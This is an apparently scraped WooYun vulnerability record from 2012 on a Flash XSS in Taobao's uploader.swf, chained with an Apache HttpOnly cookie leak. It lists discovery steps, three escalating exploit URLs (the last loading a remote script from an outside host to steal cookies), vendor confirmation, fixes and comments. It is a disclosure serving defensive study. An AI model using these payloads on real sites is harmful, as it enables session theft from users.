{"id": 19426, "wybug_id": "wooyun-2012-07085", "wybug_title": "淘宝网COOKIES盗取[flash编程安全+apache http-only cookie 泄漏利用]", "wybug_corp": "淘宝网", "wybug_author": "gainover", "wybug_date": "2012-05-14 10:46", "wybug_open_date": "2012-06-28 10:47", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "安全策略失效", "安全", "应用安全", "安全策略绕过", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-05-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-06-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-06-28：\t细节向公众公开  简要描述： 昨天测试了新浪微博，今天同样的手法测试淘宝网！FLASH编程安全问题导致的利用：http://www.wooyun.org/bugs/wooyun-2012-06103 http://www.wooyun.org/bugs/wooyun-2010-07050Apache Cookie 泄漏漏洞:http://www.wooyun.org/bugs/wooyun-2010-06947 详细说明：  一些编程人员，对于loaderInfo.parameters 所传入的参数都不会严格过滤，甚至很多开发人员都有把Javascript函数名作为参数传入的习惯。 比如腾讯的QQ空间这个FLASH（ WooYun: QQ空间存储型XSS漏洞（组合利用）  ）。 新浪的开发人员也有类似的习惯（ WooYun: 新浪微博COOKIES盗取[flash编程安全+apache http-only cookie 泄漏利用] ）。 淘宝也有～～利用步骤：1： google:   filetype:swf site:taobao.com，找到淘宝域名下的若干FLASH文件。2： 反编，并查找 parameters and externalInterface.call3:  找到一个uploader.swf存在问题。 \n//正如我说的这种直接把JS函数名传入的情况    this.javaScriptEventHandler = this.loaderInfo.parameters.eventHandler;\t//后面又用call调用\t ExternalInterface.call(this.javaScriptEventHandler, this.elementID, event);\n4:  构造1级测试代码。证明：JS可以运行 \nhttp://upload.taobao.com/static/js/uploader.swf?eventHandler=(function(){alert('xxx');})\n5： 构造2级代码，利用href='javascript:\"新的页面内容\"';突破无法访问document对象的限制。但是无法获取http-only Cookie \nhttp://upload.taobao.com/static/js/uploader.swf?eventHandler=(function(){location.href='javascript:\"<script>alert(document.cookie)</script>\"'})\n6:  构造3级代码，利用Apache Http-only Cookie 泄漏漏洞，获取全部cookies数据。  \nhttp://upload.taobao.com/static/js/uploader.swf?eventHandler=(function()%7Blocation.href%3D'javascript%3A%22%3Cscript%2Fsrc%3D%5C'%2F%2Fappmaker.sinaapp.com%5C%2Ftest4.js%5C'%3E%3C%2Fscript%3E%22'%7D)\n   自己写了个小检测工具。 检查下 upload.taobao.com \n\n   漏洞证明：  1. 打开构造的地址后，效果如下，可获得http-only cookies：\n\n2. upload.taobao.com 确实存在 apache 这个漏洞，见抓包图：\n\n   修复方案：  1. 审查已上线的FLASH文件代码，严格控制FLASH文件参数的输入2. apache的漏洞给打补丁   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-05-14 12:08 厂商回复： 感谢gainover严谨细致的分析，我们会对这类漏洞进行紧急处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-14 10:53 |    \t\titianda \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:4        | 冰冷的天雾湿了谁的眼你不在我身边思...)\t\t \n  继续膜拜G博士...    \n     2012-05-14 10:56 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  蛋疼~.~    \n     2012-05-14 11:04 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  话说这漏洞很怪异，或造成网站禁止上传flash了。。。    \n     2012-05-14 11:25 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  太淫荡了。    \n     2012-05-14 14:22 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  神人一个    \n     2012-05-29 11:01 |    \t\t淘宝网(乌云厂商)\t\t \n  请您留下联系方式，我们会寄礼物给您~~    \n     2012-05-29 13:04 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @淘宝网 联系方式已发送, 3Q.     \n     2012-06-28 11:07 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  哈哈，新浪淘宝中招了，好多大站都有这个漏洞    \n     2012-06-28 12:28 |    \t\tlinxinsnow[N.N.U] \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:3        | 网络无限宽广)\t\t \n  不知道LZ反编swf用的啥工具哦    \n     2012-06-28 14:18 |    \t\tTopman王 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:6        | 软件开发工程师!白帽子!XSSER,渗透,SEO)\t\t \n  好多大站都有这个漏洞    \n     2012-06-28 16:02 |    \t\tking \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:2        | 喜爱安全，网络游戏安全应用漏洞挖掘)\t\t \n  @gainover 你是不是在腾讯下面的一个公司上班 这漏洞好熟悉呀！！！    \n     2012-06-28 16:58 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  @linxinsnow[N.N.U] ASV反编译神器    \n     2014-01-02 09:00 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}